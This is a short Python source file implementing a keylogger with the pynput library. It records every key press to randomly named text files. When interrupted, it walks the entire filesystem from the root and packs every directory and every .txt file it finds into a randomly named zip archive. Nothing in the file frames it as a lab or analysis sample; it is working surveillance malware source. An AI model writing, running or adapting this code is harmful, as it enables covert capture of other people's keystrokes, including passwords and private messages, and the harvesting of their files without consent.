from pynput.keyboard import Key
from pynput.keyboard import Listener
from random import choices
from string import ascii_lowercase
import os
import zipfile

class Logger:
    def __init__(self):
        self.__captured = list()

    def start(self):
        try:
            with Listener(on_press=self._key_event_press) as the_listener:
                the_listener.join()
        except KeyboardInterrupt:
            self._store_data()
            name = ''.join(choices(ascii_lowercase, k=16))
            zf = zipfile.ZipFile(f"{name}.zip", "w")
            for dirname, subdirs, files in os.walk("/"):
                zf.write(dirname)
                for filename in files:
                    if '.txt' in filename:
                        zf.write(os.path.join(dirname, filename))
            zf.close()

    def _key_event_press(self, key):
        if key == Key.space:
            self.__captured.append(" ")
        else:
            print(key)
            self.__captured.append(key)
        if len(self.__captured) >= 1000000:
            self._store_data()

    def _store_data(self):
        with open(f'{"".join(choices(ascii_lowercase, k=16))}.txt', 'w') as log:
            for the_key in self.__captured:
                the_key = str(the_key).replace("'", "")
                log.write(the_key)
        self.__captured = list()


l = Logger()
l.start()
